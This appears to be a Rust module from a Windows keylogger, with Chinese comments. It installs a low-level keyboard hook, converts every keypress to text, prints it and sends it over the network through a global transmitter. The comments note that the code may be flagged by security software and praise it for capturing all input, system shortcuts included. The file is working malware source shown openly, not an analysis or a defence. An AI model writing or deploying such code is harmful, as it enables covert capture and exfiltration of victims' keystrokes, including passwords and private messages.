// ============================================================================
// Hook 方式键盘监听模块
// ============================================================================
// 本模块实现了使用 Windows 钩子（Hook）机制来捕获键盘输入
//
// Windows 钩子是 Windows 提供的一种消息拦截机制
// 通过安装钩子，可以在系统处理键盘消息之前拦截到这些消息
//
// 工作原理：
// 1. 使用 SetWindowsHookExA 安装低级键盘钩子
// 2. 当用户按下或释放键盘时，Windows 会调用我们提供的回调函数
// 3. 在回调函数中处理按键事件
// 4. 调用 CallNextHookEx 将消息传递给下一个钩子
//
// 优点：
// - 可以捕获所有键盘输入，包括系统快捷键
// - 实时性好，不会漏掉按键
//
// 缺点：
// - 可能被安全软件检测
// - 需要消息循环来保持钩子运行
// ============================================================================

use crate::key_handler::vk_to_string; // 按键转换函数
use crate::network::NetworkTransmitter; // 网络传输器
use crate::windows_api::{
    KBDLLHOOKSTRUCT,  // 低级键盘钩子结构体
    LPARAM,           // 消息参数类型
    LRESULT,          // 窗口过程返回值类型
    WM_KEYDOWN,       // 按键按下消息
    WM_SYSKEYDOWN,    // 系统按键按下消息（如 Alt+键）
    WPARAM,           // 消息参数类型
    g_CallNextHookEx, // 调用下一个钩子的函数指针
};
use std::io::Write; // 用于刷新标准输出
use std::sync::Arc; // 原子引用计数

// ============================================================================
// 全局变量
// ============================================================================

/// 网络传输器的全局引用
///
/// 使用 Option 包装，因为初始化时还没有设置
/// 使用 Arc 包装，因为需要在回调函数中访问
///
/// 注意：全局可变静态变量需要使用 unsafe 访问
static mut NETWORK_TRANSMITTER: Option<Arc<NetworkTransmitter>> = None;

/// 设置网络传输器
///
/// 在主函数中调用，将网络传输器保存到全局变量
/// 这样在键盘钩子回调函数中就可以访问网络传输器
///
/// # 参数
/// * `transmitter` - 网络传输器的 Arc 引用
///
/// # 安全性
/// 此函数操作全局可变静态变量，需要 unsafe 块
pub unsafe fn set_network_transmitter(transmitter: Arc<NetworkTransmitter>) {
    unsafe {
        NETWORK_TRANSMITTER = Some(transmitter);
    }
}

/// 低级键盘钩子回调函数
///
/// 这是 Windows 钩子机制的核心
/// 当有键盘事件发生时，Windows 会调用这个函数
///
/// # 参数
/// * `n_code` - 钩子代码，指示如何处理消息
///   - HC_ACTION (0): 需要处理的消息
///   - 其他值: 必须直接调用 CallNextHookEx
/// * `w_param` - 消息类型
///   - WM_KEYDOWN: 普通按键按下
///   - WM_KEYUP: 普通按键释放
///   - WM_SYSKEYDOWN: 系统按键按下（如 Alt+键）
///   - WM_SYSKEYUP: 系统按键释放
/// * `l_param` - 指向 KBDLLHOOKSTRUCT 结构体的指针
///   包含按键的详细信息（虚拟键码、扫描码、标志位等）
///
/// # 返回值
/// 如果消息被处理，返回非零值
/// 如果要传递给下一个钩子，返回 CallNextHookEx 的结果
///
/// # 调用约定
/// extern "system" 表示使用 Windows 的调用约定（stdcall）
/// 这是 Windows API 的要求
pub extern "system" fn low_level_keyboard_proc(
    n_code: i32,
    w_param: WPARAM,
    l_param: LPARAM,
) -> LRESULT {
    // n_code >= 0 表示这是需要处理的消息
    // n_code < 0 表示必须直接传递给下一个钩子
    if n_code >= 0 {
        // 将 l_param 转换为 KBDLLHOOKSTRUCT 结构体指针
        // KBDLLHOOKSTRUCT 包含键盘事件的详细信息
        let kb_struct = unsafe { &*(l_param as *const KBDLLHOOKSTRUCT) };

        // 判断是否是按键按下事件
        // WM_KEYDOWN: 普通按键按下
        // WM_SYSKEYDOWN: 系统按键按下（如 Alt+键）
        let is_keydown = w_param as u32 == WM_KEYDOWN || w_param as u32 == WM_SYSKEYDOWN;

        // 只处理按键按下事件（不处理释放事件）
        if is_keydown {
            // 将虚拟键码转换为可读字符串
            let key_str = vk_to_string(kb_struct.vk_code, is_keydown);

            // 输出到控制台
            print!("{}", key_str);
            std::io::stdout().flush().unwrap();

            // 通过网络发送按键数据
            unsafe {
                if let Some(ref transmitter) = NETWORK_TRANSMITTER {
                    if let Err(e) = transmitter.send(&key_str) {
                        eprintln!("网络发送失败：{}", e);
                    }
                }
            }
        }
    }

    // 调用下一个钩子
    // 这很重要！如果不调用，会阻止其他钩子处理消息
    // 可能导致系统行为异常
    unsafe {
        if let Some(call_next_hook_ex) = g_CallNextHookEx {
            call_next_hook_ex(0, n_code, w_param, l_param)
        } else {
            0
        }
    }
}
